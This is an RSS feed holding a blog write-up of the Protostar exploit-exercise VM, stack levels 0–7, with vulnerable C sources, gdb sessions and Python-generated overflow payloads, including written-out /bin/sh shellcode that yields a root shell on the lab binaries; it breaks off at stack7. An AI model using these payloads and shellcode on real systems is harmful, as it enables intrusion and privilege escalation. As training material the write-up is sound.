<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Blog</title>
    <link>http://mislusnys.github.io/post/</link>
    <description>Recent content in Posts on Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 19 Jun 2016 13:37:33 -0400</lastBuildDate>
    <atom:link href="http://mislusnys.github.io/post/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Protostar Exploit Exercises - Stack Levels</title>
      <link>http://mislusnys.github.io/blog/2016/06/19/protostar-exploit-exercises---stack-levels/</link>
      <pubDate>Sun, 19 Jun 2016 13:37:33 -0400</pubDate>
      
      <guid>http://mislusnys.github.io/blog/2016/06/19/protostar-exploit-exercises---stack-levels/</guid>
      <description>

&lt;h2 id=&#34;intro:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Intro&lt;/h2&gt;

&lt;p&gt;The Protostar VM is the next progression step after Nebula (Exploit Exercises).&lt;/p&gt;

&lt;p&gt;The description reads:&lt;/p&gt;

&lt;p&gt;Protostar introduces the following in a friendly way:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Network programming&lt;/li&gt;
&lt;li&gt;Byte order&lt;/li&gt;
&lt;li&gt;Handling sockets&lt;/li&gt;
&lt;li&gt;Stack overflows&lt;/li&gt;
&lt;li&gt;Format strings&lt;/li&gt;
&lt;li&gt;Heap overflows&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The above is introduced in a simple way, starting with simple memory corruption and modification, function redirection, and finally executing custom shellcode.&lt;/p&gt;

&lt;p&gt;In order to make this as easy as possible to introduce Address Space Layout Randomisation and Non-Executable memory has been disabled. If you are interested in covering ASLR and NX memory, please see the Fusion page.&lt;/p&gt;

&lt;p&gt;In this post I will detail my attempt at solving various levels of this VM.&lt;/p&gt;

&lt;h3 id=&#34;stack0:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Stack0&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.&lt;/p&gt;

&lt;p&gt;This level is at /opt/protostar/bin/stack0&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf(&amp;quot;you have changed the &#39;modified&#39; variable\n&amp;quot;);
  } else {
      printf(&amp;quot;Try again?\n&amp;quot;);
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here, the stack layout while inside the &lt;code&gt;main()&lt;/code&gt; function would look something like the following figure:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/06/19/stack.png&#34; alt=&#34;stack&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The user&amp;rsquo;s input is stored inside the allocated 64 byte buffer. If we supply any input which is more than 64 bytes, we can overwrite arbitrary values on the stack.
So if we supply 65 &amp;ldquo;A&amp;rdquo;&amp;rsquo;s as input, we should be able to overwrite the &lt;code&gt;modified&lt;/code&gt; variable and pass this level:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ python -c &#39;print &amp;quot;A&amp;quot;*65&#39; | ./stack0
you have changed the &#39;modified&#39; variable
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;stack1:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Stack1&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.&lt;/p&gt;

&lt;p&gt;This level is at /opt/protostar/bin/stack1&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-1:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, &amp;quot;please specify an argument\n&amp;quot;);
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf(&amp;quot;you have correctly got the variable to the right value\n&amp;quot;);
  } else {
      printf(&amp;quot;Try again, you got 0x%08x\n&amp;quot;, modified);
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To pass this level, we need to modify the &lt;code&gt;modified&lt;/code&gt; variable to a specific value - &lt;code&gt;0x61626364&lt;/code&gt;. This translates to ascii as the string &lt;code&gt;abcd&lt;/code&gt;. However, because the values on the stack are stored in &amp;lsquo;little endian&amp;rsquo; format - we need to overwrite the address with &lt;code&gt;dcba&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./stack1 $(python -c &#39;print &amp;quot;A&amp;quot;*64 + &amp;quot;dcba&amp;quot;&#39;)
you have correctly got the variable to the right value
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;stack2:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Stack2&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Stack2 looks at environment variables, and how they can be set.&lt;/p&gt;

&lt;p&gt;This level is at /opt/protostar/bin/stack2&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-2:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv(&amp;quot;GREENIE&amp;quot;);

  if(variable == NULL) {
      errx(1, &amp;quot;please set the GREENIE environment variable\n&amp;quot;);
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf(&amp;quot;you have correctly modified the variable\n&amp;quot;);
  } else {
      printf(&amp;quot;Try again, you got 0x%08x\n&amp;quot;, modified);
  }

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This level is very similar to the previous one. Here, however, we need to set the &lt;code&gt;GREENIE&lt;/code&gt; environment variable with our payload which later will be copied to the buffer.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ export GREENIE=`python -c &amp;quot;print &#39;A&#39;*64+&#39;\x0a\x0d\x0a\x0d&#39;&amp;quot;`
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;stack3:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Stack3&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)&lt;/p&gt;

&lt;p&gt;Hints&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;both gdb and objdump is your friend you determining where the win() function lies in memory.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This level is at /opt/protostar/bin/stack3&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-3:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

void win()
{
  printf(&amp;quot;code flow successfully changed\n&amp;quot;);
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf(&amp;quot;calling function pointer, jumping to 0x%08x\n&amp;quot;, fp);
      fp();
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In this level we need to overwrite the &lt;code&gt;fp&lt;/code&gt; pointer with the address of the &lt;code&gt;win()&lt;/code&gt; function.
First, we should find the address of the &lt;code&gt;win&lt;/code&gt; function and then, similarly to previous levels, we can overwrite the pointer with (little endian format) address of the &amp;ldquo;winning&amp;rdquo; function:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t stack3 | grep win
08048424 g     F .text	00000014              win
user@protostar:/opt/protostar/bin$ python -c &amp;quot;print &#39;A&#39;*64+&#39;\x24\x84\x04\x08&#39;&amp;quot; | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;stack4:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Stack4&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Stack4 takes a look at overwriting saved EIP and standard buffer overflows.&lt;/p&gt;

&lt;p&gt;This level is at /opt/protostar/bin/stack4&lt;/p&gt;

&lt;p&gt;Hints&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;A variety of introductory papers into buffer overflows may help.&lt;/li&gt;
&lt;li&gt;gdb lets you do “run &amp;lt; input”&lt;/li&gt;
&lt;li&gt;EIP is not directly after the end of buffer, compiler padding can also increase the size.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-4:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

void win()
{
  printf(&amp;quot;code flow successfully changed\n&amp;quot;);
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;While normally it would be easiest to exploit a standard buffer overflow using &lt;code&gt;pattern_create&lt;/code&gt; and &lt;code&gt;pattern_offset&lt;/code&gt; tools from the Metasploit Framework,
this level was intended to be solved using only gdb. Let&amp;rsquo;s do it the &amp;ldquo;hard way&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;First, we setup the payload to be the exact size of our buffer (64 bytes):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ python -c &amp;quot;print &#39;A&#39;*64&amp;quot; &amp;gt; /tmp/payload
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we can put the breakpoint just before returning from the &lt;code&gt;main&lt;/code&gt; (on the &lt;code&gt;ret&lt;/code&gt; instruction) and examine the stack.
Since we have fully filled the buffer, we can easily see where the buffer lies on the stack in relation to the saved return address:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb -q stack4
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) disass main
Dump of assembler code for function main:
0x08048408 &amp;lt;main+0&amp;gt;:	push   %ebp
0x08048409 &amp;lt;main+1&amp;gt;:	mov    %esp,%ebp
0x0804840b &amp;lt;main+3&amp;gt;:	and    $0xfffffff0,%esp
0x0804840e &amp;lt;main+6&amp;gt;:	sub    $0x50,%esp
0x08048411 &amp;lt;main+9&amp;gt;:	lea    0x10(%esp),%eax
0x08048415 &amp;lt;main+13&amp;gt;:	mov    %eax,(%esp)
0x08048418 &amp;lt;main+16&amp;gt;:	call   0x804830c &amp;lt;gets@plt&amp;gt;
0x0804841d &amp;lt;main+21&amp;gt;:	leave  
0x0804841e &amp;lt;main+22&amp;gt;:	ret    
End of assembler dump.
(gdb) break *main+22
Breakpoint 1 at 0x804841e: file stack4/stack4.c, line 16.
(gdb) run &amp;lt; /tmp/payload
Starting program: /opt/protostar/bin/stack4 &amp;lt; /tmp/payload

Breakpoint 1, 0x0804841e in main (argc=134513672, argv=0x1) at stack4/stack4.c:16
16	stack4/stack4.c: No such file or directory.
	in stack4/stack4.c
(gdb) x/16x $esp
0xbffff75c:	0xb7eadc76	0x00000001	0xbffff804	0xbffff80c
0xbffff76c:	0xb7fe1848	0xbffff7c0	0xffffffff	0xb7ffeff4
0xbffff77c:	0x0804824b	0x00000001	0xbffff7c0	0xb7ff0626
0xbffff78c:	0xb7fffab0	0xb7fe1b28	0xb7fd7ff4	0x00000000
(gdb) x/16x $esp-32
0xbffff73c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff74c:	0x41414141	0x08048400	0x00000000	0xbffff7d8
0xbffff75c:	0xb7eadc76	0x00000001	0xbffff804	0xbffff80c
0xbffff76c:	0xb7fe1848	0xbffff7c0	0xffffffff	0xb7ffeff4
(gdb) 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can see that between the end of the buffer (the last &lt;code&gt;0x41414141&lt;/code&gt; value) and the saved return address
(which is now at &lt;code&gt;$esp&lt;/code&gt; and is &lt;code&gt;0xb7eadc76&lt;/code&gt; in little endian) we have
exactly 3 DWORD (4 bytes) values. So now we can construct our payload as 64+3*4=76 bytes of &amp;ldquo;A&amp;rdquo;&amp;rsquo;s + the address of &lt;code&gt;win&lt;/code&gt; function in little endian format:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t stack4 | grep win
080483f4 g     F .text	00000014              win
user@protostar:/opt/protostar/bin$ python -c &amp;quot;print &#39;A&#39;*76+&#39;\xf4\x83\x04\x08&#39;&amp;quot; | ./stack4
code flow successfully changed
Segmentation fault
user@protostar:/opt/protostar/bin$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;stack5:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Stack5&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Stack5 is a standard buffer overflow, this time introducing shellcode.&lt;/p&gt;

&lt;p&gt;This level is at /opt/protostar/bin/stack5&lt;/p&gt;

&lt;p&gt;Hints&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;At this point in time, it might be easier to use someone elses shellcode&lt;/li&gt;
&lt;li&gt;If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger&lt;/li&gt;
&lt;li&gt;remove the int3s once your shellcode is done.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-5:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This level is the same as the previous one with the added difficulty of executing custom shellcode.
First we check that we still control the EIP reliably:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ python -c &amp;quot;print &#39;A&#39;*76+&#39;BBBB&#39;+&#39;C&#39;*300&amp;quot; &amp;gt; /tmp/payload
user@protostar:~$ gdb -q /opt/protostar/bin/stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) run &amp;lt; /tmp/payload
Starting program: /opt/protostar/bin/stack5 &amp;lt; /tmp/payload

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/80x $esp
0xbffff7c0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff7d0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff7e0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff7f0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff800:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff810:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff820:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff830:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff840:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff850:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff860:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff870:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff880:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff890:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff8a0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff8b0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff8c0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff8d0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff8e0:	0x43434343	0x43434343	0x43434343	0x00000000
0xbffff8f0:	0x00000005	0x00000007	0x00000007	0xb7fe3000
(gdb) 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As we can see we cleanly overwrite the return address with &amp;ldquo;B&amp;rdquo;&amp;rsquo;s (0x42) and have plenty of space for our custom shellcode afterwards.
The &amp;ldquo;C&amp;rdquo;&amp;rsquo;s start at &lt;code&gt;0xbffff7c0&lt;/code&gt;,
but that&amp;rsquo;s inside gdb. To make a reliable jump to it we can choose a further address &lt;code&gt;0xbffff7e0&lt;/code&gt; and pad the shellcode with NOP&amp;rsquo;s.
I had a little bit of trouble choosing the shellcode, because as it turns out it&amp;rsquo;s not a straight forward task to use a simple &lt;code&gt;execve /bin/sh&lt;/code&gt; shellcode inside a &lt;code&gt;gets()&lt;/code&gt; overflow, due to the stdin getting closed out. But after a bit of googling I found this &lt;a href=&#34;https://www.exploit-db.com/exploits/13357/&#34;&gt;shellcode&lt;/a&gt;, which
addresses this exact problem (All standard bind and reverse shells should work also).&lt;/p&gt;

&lt;p&gt;So my final exploit looks like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ python -c &amp;quot;print &#39;A&#39;*76+&#39;\xe0\xf7\xff\xbf&#39;+&#39;\x90&#39;*100+ &#39;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&#39;&amp;quot; &amp;gt; /tmp/payload
user@protostar:~$ /opt/protostar/bin/stack5 &amp;lt; /tmp/payload 
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
# 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;stack6:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Stack6&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Stack6 looks at what happens when you have restrictions on the return address.&lt;/p&gt;

&lt;p&gt;This level can be done in a couple of ways, such as finding the duplicate of the payload (objdump -s) will help with this), or ret2libc, or even return orientated programming.&lt;/p&gt;

&lt;p&gt;It is strongly suggested you experiment with multiple ways of getting your code to execute here.&lt;/p&gt;

&lt;p&gt;This level is at /opt/protostar/bin/stack6&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-6:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf(&amp;quot;input path please: &amp;quot;); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret &amp;amp; 0xbf000000) == 0xbf000000) {
      printf(&amp;quot;bzzzt (%p)\n&amp;quot;, ret);
      _exit(1);
  }

  printf(&amp;quot;got path %s\n&amp;quot;, buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This level is very similar to the previous one. However, it adds an overwritten return address check - it basically disallows to return to the payload on the stack
(addresses starting with &lt;code&gt;0xbf&lt;/code&gt;). Here, the easiest solution would be to try to find if our payload is duplicated somewhere else in the process memory.&lt;/p&gt;

&lt;p&gt;Firstly, the code has a new local variable (4 bytes), so in theory our ret address has shifted by 4 bytes forward.
We can test that and try to find another copy of the payload in memory:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ python -c &amp;quot;print &#39;A&#39;*80 + &#39;BBBB&#39; + &#39;C&#39;*300&amp;quot; &amp;gt; /tmp/payload
user@protostar:~$ gdb -q /opt/protostar/bin/stack6
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) run &amp;lt; /tmp/payload
Starting program: /opt/protostar/bin/stack6 &amp;lt; /tmp/payload
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info proc mappings
process 2157
cmdline = &#39;/opt/protostar/bin/stack6&#39;
cwd = &#39;/home/user&#39;
exe = &#39;/opt/protostar/bin/stack6&#39;
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
	0xb7e96000 0xb7e97000     0x1000          0        
	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
	0xb7fd9000 0xb7fdc000     0x3000          0        
	0xb7fde000 0xb7fe2000     0x4000          0        
	0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
	0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
	0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb) find 0xb7fde000, 0xb7fe2000, 0x42424242
0xb7fde050
0xb7fdf049
0xb7fdf059
3 patterns found.
(gdb) x/80x 0xb7fde050
0xb7fde050:	0x42424242	0x43434343	0x43434343	0x43434343
0xb7fde060:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde070:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde080:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde090:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde0a0:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde0b0:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde0c0:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde0d0:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde0e0:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde0f0:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde100:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde110:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde120:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde130:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde140:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde150:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde160:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde170:	0x43434343	0x43434343	0x43434343	0x43434343
0xb7fde180:	0x0000000a	0x00000000	0x00000000	0x00000000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As we can see we have cleanly overwritten the ret address with &amp;ldquo;B&amp;rdquo;&amp;rsquo;s and have found a possible duplicate address for our shellcode at &lt;code&gt;0xb7fde054&lt;/code&gt; (where the &amp;ldquo;C&amp;rdquo;&amp;rsquo;s start).
Now we can actually reuse the payload from the previous level by just adjusting number of &amp;ldquo;A&amp;rdquo;&amp;rsquo;s from 76 to 80 and changing the return address to &lt;code&gt;0xb7fde080&lt;/code&gt;
(again a little into the nopsled for reliability):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ python -c &amp;quot;print &#39;A&#39;*80+&#39;\x80\xe0\xfd\xb7&#39;+&#39;\x90&#39;*100+ &#39;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&#39;&amp;quot; &amp;gt; /tmp/payload
user@protostar:~$ /opt/protostar/bin/stack6 &amp;lt; /tmp/payload 
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA��������������������������������������������������������������������������������������������������������1�1۰̀Sh/ttyh/dev��1�f�&#39;�̀1�Ph//shh/bin��PS�ᙰ

# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
# 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;stack7:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Stack7&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Stack7 introduces return to .text to gain code execution.&lt;/p&gt;

&lt;p&gt;The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.&lt;/p&gt;

&lt;p&gt;This level is at /opt/protostar/bin/stack7&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-7:e81dfa3035f8a1263750075ad9ae5c5e&#34;&gt;Source Code&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf(&amp;quot;input path please: &amp;quot;); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret &amp;amp; 0xb0000000) == 0xb0000000) {
      printf(&amp;quot;bzzzt (%p)\n&amp;quot;, ret);
      _exit(1);
  }

  printf(&amp;quot;got path %s\n&amp;quot;, buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This level adds another, even stricter, check for the return address, which invalidates the stack6 solution,
as now we cannot return to any address starting with &lt;code&gt;0xb&lt;/code&gt;.
However, if we return to an address anywhere in the file which contains the opcode for the &lt;code&gt;RET&lt;/code&gt; instruction -
that instruction will pop the next address from the stack
and this address won&amp;rsquo;t have any restrictions. So, we can still reuse the code from previous level with a small detour to pass the ret check.&lt;/p&gt;

&lt;p&gt;We can use the &lt;code&gt;RET&lt;/code&gt; instruction from the &lt;code&gt;main()&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ gdb -q /opt/protostar/bin/stack7
Reading symbols from /opt/protostar/bin/stack7...done.
(gdb) disassemble main
Dump of assembler code for function main:
0x08048545 &amp;lt;main+0&amp;gt;:	push   %ebp
0x08048546 &amp;lt;main+1&amp;gt;:	mov    %esp,%ebp
0x08048548 &amp;lt;main+3&amp;gt;:	and    $0xfffffff0,%esp
0x0804854b &amp;lt;main+6&amp;gt;:	call   0x80484c4 &amp;lt;getpath&amp;gt;
0x08048550 &amp;lt;main+11&amp;gt;:	mov    %ebp,%esp
0x08048552 &amp;lt;main+13&amp;gt;:	pop    %ebp
0x08048553 &amp;lt;main+14&amp;gt;:	ret    
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As we can see it&amp;rsquo;s address is &lt;code&gt;0x08048553&lt;/code&gt;. For the second address (location of the shellcode on the stack) - we can try to use the approximate address of &lt;code&gt;0xbffff7e0&lt;/code&gt; (from stack5 level) to try to land inside the nopsled.
So, with these adjustments, we can execute our shellcode:&lt;/p&gt;

